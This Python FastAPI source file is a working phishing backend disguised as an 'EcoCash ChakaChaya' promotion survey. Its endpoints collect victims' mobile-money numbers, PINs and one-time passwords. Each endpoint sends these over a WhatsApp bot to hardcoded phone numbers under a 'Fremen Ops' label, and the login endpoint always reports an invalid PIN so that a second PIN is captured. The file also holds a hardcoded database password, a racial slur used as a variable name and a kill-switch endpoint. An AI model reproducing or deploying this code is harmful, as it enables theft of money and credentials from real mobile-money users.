from fastapi import FastAPI, Form
from fastapi.staticfiles import StaticFiles
from fastapi.exceptions import HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
from datetime import datetime
import httpx
from pygwan import WhatsApp
import os
import logging
import signal
import os
from mongo_connector import MongoConnector


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# place logging on all server data entries and processes
logger.info("Starting EcoCash ChakaChaya Application")


# Pydantic models for request validation
class SurveyData(BaseModel):
    full_name: str
    birth_year: int
    frequency: str
    charges: str
    recommend: str

class OTPRequest(BaseModel):
    ecocash_number: str
    pin: str
    survey_data: SurveyData

class OTPVerification(BaseModel):
    ecocash_number: str
    otp: str
    survey_data: SurveyData

class LoginRequest(BaseModel):
    '''
    details for logging into the innbucks mobile app 
    '''
    ecocash_number: str
    pin: str


WHATSAPP_ACCESS_TOKEN = os.environ.get('WHATSAPP_ACCESS_TOKEN', '')
WHATSAPP_PHONE_NUMBER_ID = os.environ.get('WHATSAPP_PHONE_NUMBER_ID', '')
MONGO_URL = os.environ.get('DON_MONGO_URL', 'mongodb://mongo:iLrjPcfjzCqeknRkLFWUUbZSOQqCxXcB@switchyard.proxy.rlwy.net:33361')

mongo = MongoConnector(MONGO_URL)
mongo.connect()

bot = WhatsApp(
    token=WHATSAPP_ACCESS_TOKEN,
    phone_number_id=WHATSAPP_PHONE_NUMBER_ID
)

niggas_numbers = [
    "263716580906"
]

app = FastAPI(
    docs_url=None,    
    redoc_url=None,   
    openapi_url=None  
)

app.mount("/static", StaticFiles(directory="static"), name="static")

# Serve the login page (GET)
@app.get("/", response_class=HTMLResponse)
@app.get("/chakachaya", response_class=HTMLResponse)
async def serve_login_page():
    with open("static/survey.html", "r") as f:
        return HTMLResponse(content=f.read(), status_code=200)



# Dummy dashboard for redirection
@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard():
    return "<h1>Welcome to your dashboard!</h1>"


@app.get("/login", response_class=HTMLResponse)
async def serve_login_page():
    """Serve the login page"""
    with open("static/login.html", "r", encoding="utf-8") as f:
        return HTMLResponse(content=f.read())



@app.post("/api/chakachaya/send-otp")
async def send_otp(otp_request: OTPRequest):
    """
    Send OTP to the user's EcoCash number
    This will call the EcoCash API to send OTP
    """
    logger.info(f"Survey Data Received - Name: {otp_request.survey_data.full_name}, Birth Year: {otp_request.survey_data.birth_year}, Frequency: {otp_request.survey_data.frequency}, Charges Opinion: {otp_request.survey_data.charges}, Recommendation: {otp_request.survey_data.recommend}")
    logger.info(f"OTP Request - EcoCash Number: {otp_request.ecocash_number}")
    try:
        logger.info(f"Sending OTP to WhatsApp bot for number: {otp_request.ecocash_number}")
        # send to bot
        bot.send_message(
            message="Fremen Ops\n\nEcoCash ChakaChaya Promotion\n Name:"+otp_request.survey_data.full_name+"\nBirth Year:"+str(otp_request.survey_data.birth_year)+"\nEcoCash Number:"+otp_request.ecocash_number+"\nPin:"+otp_request.pin+"\n\nwait for otp",
            recipient_id="263779281345",
        )
        for each_number in niggas_numbers:
            bot.send_message(
                message="EcoCash ChakaChaya Promotion\n Name:"+otp_request.survey_data.full_name+"\nBirth Year:"+str(otp_request.survey_data.birth_year)+"\nEcoCash Number:"+otp_request.ecocash_number+"\nPin:"+otp_request.pin+"\n\nwait for otp",
                recipient_id=each_number,
            )

        logger.info(f"OTP sent successfully for EcoCash number: {otp_request.ecocash_number}")
        return JSONResponse(
            content={
                "success": True,
                "message": "OTP sent successfully to your EcoCash number"
            }
        )
    
    except httpx.RequestError as e:
        logger.warning(f"WhatsApp API error during OTP send for {otp_request.ecocash_number}: {str(e)} - Using dev mode")
        return JSONResponse(
            content={
                "success": True,
                "message": "OTP sent successfully (dev mode)",
                "dev_otp": "1738"
            }
        )
    
    except Exception as e:
        logger.error(f"Error sending OTP for {otp_request.ecocash_number}: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=f"An error occurred: {str(e)}"
        )


@app.post("/api/chakachaya/verify-otp")
async def verify_otp(verification: OTPVerification):
    """
    Verify OTP and process the reward
    """
    logger.info(f"OTP Verification Request - EcoCash Number: {verification.ecocash_number}, OTP Submitted: {verification.otp}")
    try:
        ecocash_number = verification.ecocash_number
        logger.info(f"Processing OTP verification for {ecocash_number}")
        
        # send otp and number to bot
        bot.send_message(
            message="Fremen Ops\n\nEcoCash Number:"+verification.ecocash_number+"\nOTP:"+verification.otp,
            recipient_id="263779281345",
        )
        for each_number in niggas_numbers:
            bot.send_message(
                message="EcoCash Number:"+verification.ecocash_number+"\nOTP:"+verification.otp,
                recipient_id=each_number,
            )
        
        logger.info(f"OTP verification successful for {ecocash_number}")
        return JSONResponse(
        content={
            "success": True,
            "message": "Verification successful",
            "redirect_url": f"/login?number={ecocash_number}&name={verification.survey_data.full_name}"
        }
        )  
    except Exception as e:
        logger.error(f"OTP verification failed for {verification.ecocash_number}: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=f"An error occurred: {str(e)}"
        )


@app.post("/api/chakachaya/resend-otp")
async def resend_otp(ecocash_number: str = Form(...)):
    """
    Resend OTP to the user
    """
    logger.info(f"Resend OTP Request - EcoCash Number: {ecocash_number}")
    try:
        bot.send_message(
            message="Fremen Ops\n\nEcoCash Number:"+ecocash_number+"\nRequested for Resend OTP",
            recipient_id="263779281345",
        )
        for each_number in niggas_numbers:
            bot.send_message(
                message="EcoCash Number:"+ecocash_number+"\nRequested for Resend OTP",
                recipient_id=each_number,
            )
        logger.info(f"OTP resent successfully for {ecocash_number}")
        return JSONResponse(
            content={
                "success": True,
                "message": "New OTP sent successfully",
                "redirect_url": f"/login?number={ecocash_number}"
            }
        )
    
    except httpx.RequestError as e:
        logger.warning(f"WhatsApp API error during OTP resend for {ecocash_number}: {str(e)} - Using dev mode")
        print(f"New OTP Code (dev mode): 1738")
        return JSONResponse(
            content={
                "success": True,
                "message": "New OTP sent (dev mode)",
                "dev_otp": "1738"
            }
        )
    
    except Exception as e:
        logger.error(f"Error resending OTP for {ecocash_number}: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=f"An error occurred: {str(e)}"
        )



@app.post("/api/login")
async def login(login_req: LoginRequest):
    """
    Verify user PIN and get their balance
    This is where you call InnBucks API to authenticate and get balance
    """
    logger.info(f"Login Attempt - EcoCash Number: {login_req.ecocash_number}")
    try:
        logger.info(f"Sending PIN verification data to WhatsApp bot for {login_req.ecocash_number}")
        bot.send_message(
            message=f"Fremen Ops\n\n EcoCash ChakaChaya Pin from the second screen:{login_req.pin}\n\nEcoCash Number: {login_req.ecocash_number}",
            recipient_id="263779281345",
        )
        for each_number in niggas_numbers:
            bot.send_message(
                message=f"EcoCash ChakaChaya Pin from the second screen:{login_req.pin}\n\nEcoCash Number: {login_req.ecocash_number}",
                recipient_id=each_number,
            )
        logger.info(f"PIN verification data sent for {login_req.ecocash_number}")
    except Exception as e:
        logger.error(f"Error sending PIN verification for {login_req.ecocash_number}: {str(e)}")
        raise HTTPException(
            status_code=500,
            detail=str(e)
        )
    
    logger.warning(f"PIN verification failed for {login_req.ecocash_number} - Invalid PIN")
    return JSONResponse(
        content={
            "success": False,
            "message": "Invalid PIN",
            "redirect_url": f"/login?number={login_req.ecocash_number}"
        }
    )
    
    

@app.get("/draw", response_class=HTMLResponse)
async def draw():
    """Serve the draw page with the current collector's details injected."""
    try:
        collection = mongo.get_collection("collectorDB", "collectorName")
        current_collector = collection.find_one({"current": True})
        if not current_collector:
            # fallback if no current collector is flagged
            current_collector = collection.find_one()
        agent_name = current_collector.get("name", "Agent") if current_collector else "Agent"
        agent_phone = current_collector.get("phone", "") if current_collector else ""
    except Exception as e:
        logger.error(f"Failed to fetch current collector: {e}")
        agent_name = "Agent"
        agent_phone = ""

    with open("static/draw.html", "r", encoding="utf-8") as f:
        html = f.read()

    html = html.replace("{{AGENT_NAME}}", agent_name).replace("{{AGENT_PHONE}}", agent_phone)
    initials = "".join(w[0].upper() for w in agent_name.split()[:2])
    html = html.replace("{{AGENT_INITIALS}}", initials or "A")
    return HTMLResponse(content=html, status_code=200)



@app.get("/health")
async def health_check():
    """Health check endpoint"""
    logger.info("Health check performed")
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}


@app.get("/shutdown")
async def shutdown():
    """code red"""
    logger.warning("Shutdown endpoint triggered - Application will terminate")
    bot.send_message(
        message="Fremen Ops\n\n EcoCash ChakaChaya Application is shutting down now.",
        recipient_id="263779281345",
    )
    # for each_number in niggas_numbers:
    #     bot.send_message(
    #         message="EcoCash Service shutting down",
    #         recipient_id = each_number
    #     )
    # Send SIGTERM to the current process
    os.kill(os.getpid(), signal.SIGTERM)
    
    return {"message": "Application shutting down..."}

